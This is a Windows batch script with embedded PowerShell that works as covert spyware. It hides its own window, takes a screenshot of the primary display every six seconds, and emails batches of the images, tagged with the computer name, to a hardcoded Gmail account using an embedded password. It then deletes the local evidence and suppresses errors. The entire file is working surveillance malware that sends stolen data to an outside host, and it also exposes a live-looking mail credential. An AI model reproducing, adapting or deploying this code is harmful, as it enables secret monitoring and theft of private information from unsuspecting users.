@echo off
if "%~1" neq "/hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -ArgumentList '/hidden'"
    exit /b
)

:: === CONFIGURATION ===
set "screenshotFolder=%APPDATA%\screens"
set "smtpServer=smtp.gmail.com"
set "smtpPort=587"
set "emailFrom=najlepszyclicker1@gmail.com"
set "emailTo=najlepszyclicker1@gmail.com"
set "emailPass=abtoaagbiwhqxhic"
set "delaySeconds=6"

if not exist "%screenshotFolder%" mkdir "%screenshotFolder%"

set "psCommand=Add-Type -AssemblyName System.Windows.Forms; "
set "psCommand=%psCommand%Add-Type -AssemblyName System.Drawing; "
set "psCommand=%psCommand%$folder='%screenshotFolder%'; $smtpServer='%smtpServer%'; $smtpPort=%smtpPort%; "
set "psCommand=%psCommand%$emailFrom='%emailFrom%'; $emailTo='%emailTo%'; $emailPass='%emailPass%'; $delay=%delaySeconds%; "
set "psCommand=%psCommand%while ($true) { "
set "psCommand=%psCommand%for ($i=0; $i -lt 10; $i++) { "
set "psCommand=%psCommand%$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
set "psCommand=%psCommand%$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; "
set "psCommand=%psCommand%$gfx = [System.Drawing.Graphics]::FromImage($bmp); "
set "psCommand=%psCommand%$gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); "
set "psCommand=%psCommand%$ts = Get-Date -Format 'yyyyMMdd_HHmmss'; "
set "psCommand=%psCommand%$path = Join-Path $folder ('ss_' + $ts + '.png'); "
set "psCommand=%psCommand%$bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png); "
set "psCommand=%psCommand%$gfx.Dispose(); $bmp.Dispose(); Start-Sleep -Seconds $delay } "
set "psCommand=%psCommand%$attachments = Get-ChildItem $folder -Filter *.png; "
set "psCommand=%psCommand%if ($attachments.Count -gt 0) { "
set "psCommand=%psCommand%$msg = New-Object System.Net.Mail.MailMessage; "
set "psCommand=%psCommand%$msg.From = $emailFrom; $msg.To.Add($emailTo); "
set "psCommand=%psCommand%$msg.Subject = $env:COMPUTERNAME + ' - ' + (Get-Date); "
set "psCommand=%psCommand%$msg.Body = 'Automated screenshots attached.'; "
set "psCommand=%psCommand%foreach ($f in $attachments) { $msg.Attachments.Add($f.FullName) } "
set "psCommand=%psCommand%$smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort); "
set "psCommand=%psCommand%$smtp.EnableSsl = $true; "
set "psCommand=%psCommand%$smtp.Credentials = New-Object System.Net.NetworkCredential($emailFrom, $emailPass); "
set "psCommand=%psCommand%try { $smtp.Send($msg) } catch {} "
set "psCommand=%psCommand%$msg.Dispose(); $smtp.Dispose(); Remove-Item $folder\*.png -Force } }"

powershell -WindowStyle Hidden -NoProfile -Command "%psCommand%"
